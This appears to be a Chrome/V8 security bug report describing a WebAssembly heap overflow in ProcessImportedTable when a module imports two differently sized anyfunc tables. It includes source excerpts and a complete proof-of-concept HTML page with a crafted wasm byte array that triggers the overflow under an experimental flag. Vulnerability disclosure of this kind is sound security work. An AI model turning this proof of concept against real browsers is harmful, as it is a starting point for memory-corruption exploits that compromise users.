
<b>VULNERABILITY DETAILS</b>
if Module have two anyfunc, generating wasm instance, indirect_function_table size is first table size. this cause heap overflow when instance dispatch second table that is larger than first table 

<b>-------------------------</b>-----------------------
bool InstanceBuilder::ProcessImportedTable(Handle<WasmInstanceObject> instance,
..........
.........
  if (!instance->has_indirect_function_table()) {
    WasmInstanceObject::EnsureIndirectFunctionTableWithMinimumSize(
        instance, imported_table_size);
  }
.......
.......
  for (int i = 0; i < imported_table_size; ++i) {
    bool is_valid;
    bool is_null;
    MaybeHandle<WasmInstanceObject> maybe_target_instance;
    int function_index;
    WasmTableObject::GetFunctionTableEntry(isolate_, table_object, i, &is_valid,
                                           &is_null, &maybe_target_instance,
                                           &function_index);
......
    IndirectFunctionTableEntry(instance, i)
        .Set(module_->signature_map.Find(*sig), target_instance,
             function_index);
  }

calling ProcessImportedTable, indirect_function_table should be updated every time.

should turn on experimental-wasm-anyref flag

<b>VERSION</b>
Google Chrome 76.0.3788.1 (Official Build) dev (64-bit)
Operating System: Any OS

<b>REPRODUCTION CASE</b>


should turn on experimental-wasm-anyref flag
chrome.exe --js-flags="--experimental-wasm-anyref" poc.html 


<html>
<script>
let kTableSize = 0x100;
let wasm = new Uint8Array([0,97,115,109,1,0,0,0,1,30,6,96,1,127,1,127,96,1,127,1,127,96,0,1,127,96,1,127,1,127,96,1,127,1,127,96,1,127,1,127,2,38,3,3,102,102,105,4,102,117,110,99,0,0,3,102,102,105,2,116,49,1,112,1,112,128,2,3,102,102,105,2,116,50,1,112,1,112,128,32,3,4,3,3,4,5,5,4,1,1,0,1,7,29,4,6,116,97,98,108,101,49,0,1,2,104,49,0,2,2,104,50,0,3,6,109,101,109,111,114,121,2,0,10,21,3,9,0,32,0,65,0,17,1,0,11,4,0,65,1,11,4,0,65,2,11,0,24,4,110,97,109,101,1,17,3,1,6,116,97,98,108,101,49,2,2,104,49,3,2,104,50])
let module = new WebAssembly.Module(wasm);



let table1 = new WebAssembly.Table({element: "anyfunc",
                                   initial: kTableSize,
                                   maximum: 0x100});

let table2 = new WebAssembly.Table({element: "anyfunc",
                                   initial: 0x1000,
                                   maximum: 0x1000});
let instance = new WebAssembly.Instance(module, {ffi:{func:i=>i, t1:table1, t2:table2}});
let table3 = new WebAssembly.Table({element: "anyfunc",
                                   initial: 0x1000,
                                   maximum: 0x1000});
console.log("wtf");
table1.set(0,instance.exports.h1);
for(let i = 0; i < 0x1000; i++)
	table3.set(i,instance.exports.h2);
let instance2 = new WebAssembly.Instance(module, {ffi:{func:i=>i, t1:table1, t2:table3}});
console.log(instance2.exports.table1(0));
</script>
</html>